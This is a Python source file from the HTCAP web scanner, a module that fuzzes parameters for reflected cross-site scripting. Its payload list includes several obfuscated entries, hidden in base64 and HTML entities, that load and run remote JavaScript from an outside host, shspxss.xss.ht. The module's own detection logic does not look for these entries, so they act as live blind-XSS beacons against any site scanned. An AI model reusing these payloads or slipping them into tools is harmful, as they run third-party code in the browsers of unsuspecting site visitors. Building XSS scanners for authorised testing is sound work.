# -*- coding: utf-8 -*-

"""
HTCAP - 1.1
Author: filippo.cavallarin@wearesegment.com

This program is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free Software
Foundation; either version 2 of the License, or (at your option) any later
version.
"""

from __future__ import unicode_literals
import sys
import time
import re
import os
import urllib2
from HTMLParser import HTMLParser

from core.lib.exception import *
from core.crawl.lib.shared import *


from core.lib.request import Request
from core.lib.cookie import Cookie

from core.lib.utils import *
from core.constants import *

from core.scan.base_fuzzer import BaseFuzzer

KF = "alert(42354364574)"

payloads = [
	"<htcap-scan-tag>%s</htcap-scan-tag>" % KF,
	"'><htcap-scan-tag>%s</htcap-scan-tag>" % KF,
	'"><htcap-scan-tag>%s</htcap-scan-tag>' % KF,
	"1 --><htcap-scan-tag>%s</htcap-scan-tag>" % KF,
	"]]><htcap-scan-tag>%s</htcap-scan-tag>" % KF,
	" onerror=%s" % KF,
	"' onerror=%s a='" % KF,
	'" onerror=%s a="' % KF,
	# not needed
	#"</textarea><htcap-scan-tag>%s</htcap-scan-tag>" % KF,
	#"</pre><htcap-scan-tag>%s</htcap-scan-tag>" % KF,
	KF,


    '"><script src=https://shspxss.xss.ht></script>',
    "javascript:eval('var a=document.createElement(\'script\');a.src=\'https://shspxss.xss.ht\';document.body.appendChild(a)')",
    '"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vc2hzcHhzcy54c3MuaHQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus>',
    '"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vc2hzcHhzcy54c3MuaHQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>',
    '"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vc2hzcHhzcy54c3MuaHQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7>',
    '"><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;shspxss.xss.ht&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">',
    '<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//shspxss.xss.ht");a.send();</script>',
    '<script>$.getScript("//shspxss.xss.ht")</script>',


]



class XssHTMLParser(HTMLParser):
	def __init__(self):
		HTMLParser.__init__(self)
		self.text = []
		self.vulnerable = False

	def handle_starttag(self, tag, attrs):
		if tag == "htcap-scan-tag":
			self.vulnerable = True
			return
		elif tag in ("img", "input", "object", "link", "script", "body", "frame", "frameset", "iframe", "style"): #@TODO continue list
			for key, val in attrs:
				if key == "onerror" and val == KF:
					self.vulnerable = True
					return

		for key, val in attrs:
			if key[0:2] == "on" or (key == "src" and tag in ("script", "img", "frame", "frameset", "iframe", "object")) or (key == "href" and tag in ("a", "base", "link")) or (key == "action" and tag == "form"):
				if re.search(re.escape(KF), val, re.M):
					self.vulnerable = True


	def handle_data(self, d):
		self.text.append(d)

	def handle_endtag(self, tag):
		if tag in ("script", "style"):
			if re.search(re.escape(KF), "".join(self.text), re.M):
				self.vulnerable = True
		self.text = []



class XssReflected(BaseFuzzer):

	def init(self):
		pass


	def fuzz(self):
		mutations = self.get_mutations(self.request, payloads)
		vulnerabilities = []
		for m in mutations:
			try:
				resp = m.send(ignore_errors=True)
			except Exception as e:
				self.sprint("Error: %s" % e)
				continue
			parser = None
			if not resp.body:
				continue
			try:
				parser = XssHTMLParser()
				parser.feed(resp.body)
			except:
				pass

			if parser and parser.vulnerable:
				#self.sprint("\n   \033[31mFound: %s\033[0m\n     %s %s = %s" % (self.request.url, resp.method, resp.parameter, resp.payload))
				vulnerabilities.append(str(m))
				mutations.next_parameter()
				continue
		return vulnerabilities


